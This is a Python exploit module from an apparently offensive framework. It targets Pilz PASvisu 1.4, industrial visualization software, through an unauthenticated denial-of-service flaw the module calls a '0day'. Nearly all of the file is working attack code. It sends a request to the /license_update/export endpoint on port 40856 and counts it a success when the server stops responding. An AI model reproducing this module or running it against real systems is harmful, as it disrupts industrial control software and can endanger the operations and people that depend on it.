#!/usr/bin/env python

import urllib2
import socket
from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = "efs_PASvisu_dos"
INFO['DESCRIPTION'] = "Pilz PASvisu DoS"
INFO['VENDOR'] = "https://www.pilz.com"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG'] = "22 Sep, 2017"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Specially crafted TCP request cause DoS. Authentication is not required. 
Tested against PASvisu 1.4 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 40856


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        url = "http://%s:%s/%s" % (self.host, self.port, path)
        return url

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Sending DoS request')
        url = self.make_url('license_update/export')
        try:
            res = urllib2.urlopen(url, timeout=10)
        except socket.timeout as e:
            self.log('[+] Server not responds')
            self.finish(True)
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()